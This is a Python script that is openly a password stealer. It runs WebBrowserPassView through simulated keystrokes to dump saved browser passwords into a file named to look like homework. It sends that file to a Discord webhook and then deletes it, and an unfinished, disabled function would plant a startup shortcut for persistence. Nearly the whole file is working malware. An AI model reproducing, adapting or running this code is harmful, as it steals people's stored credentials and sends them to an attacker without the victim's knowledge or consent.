import os
from discord_webhook import DiscordWebhook
import keyboard
import time
import getpass
import subprocess
import pathlib
import shutil
import os, winshell
from win32com.client import Dispatch

User = getpass.getuser()
DocPath = "C:/Users/" + User + "/Documents/Homework15325.txt"
PathOfScript = pathlib.Path(__file__).parent.absolute()
StrPathOfScript = str(PathOfScript)
print(StrPathOfScript)
PathOfPswdFinder = StrPathOfScript + r'\assists\WebBrowserPassView.exe'
DiscordWebhookUrl = 'Your Discord webhook url'
def InjectIntostuftupFolder():
    desktop = winshell.desktop() # ya, soo, just ignore this. it doesnt work and im fixing it
    path = os.path.join(desktop, "Run.bat.lnk")
    target = r"C:\Users\tjpet\AppData\Roaming\Microsoft\Windows\'Start Menu'\Programs\Startup"
    wDir = r"C:\Users\tjpet\Documents\Pswd_Stealer\Run.bat"
    icon = r"C:\Users\tjpet\AppData\Roaming\Microsoft\Windows\'Start Menu'\Programs\Startup"
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.save()

def CleanUp():
    try:
        os.remove(DocPath)
    except:
        webhookDel = DiscordWebhook(url=DiscordWebhookUrl, content='Failed to Deleat Pswd File')
        webhookDel.execute()
  #  InjectIntostuftupFolder()

def Send_Pswd():
    time.sleep(0.5)
    webhook = DiscordWebhook(url=DiscordWebhookUrl, content='Atached is the Pswd list')
    try:
        with open(DocPath, "rb") as f:
            webhook.add_file(file=f.read(), filename='Pswd_List.txt')
    except:
        print('Error: File Not Found')
    response = webhook.execute()
    CleanUp()

def Get_Pswd():
    subprocess.Popen([PathOfPswdFinder], bufsize=0, shell=True)
    webhookWBPW = DiscordWebhook(url=DiscordWebhookUrl, content='Opened WebBrowserPassView')
    webhookWBPW.execute()
    time.sleep(0.5)
    keyboard.press_and_release('ctrl+a')
    time.sleep(0.1)
    keyboard.press_and_release('ctrl+s')
    webhookS = DiscordWebhook(url=DiscordWebhookUrl, content='Saving...')
    webhookS.execute()
    time.sleep(0.1)
    keyboard.write('Homework15325')
    time.sleep(0.1)
    keyboard.press_and_release('enter')
    webhookSed = DiscordWebhook(url=DiscordWebhookUrl, content='Saved')
    webhookSed.execute()
    subprocess.Popen(['assists\WebEnd.bat'], bufsize=0, shell=True)
    Send_Pswd()

print('starting...')
Get_Pswd()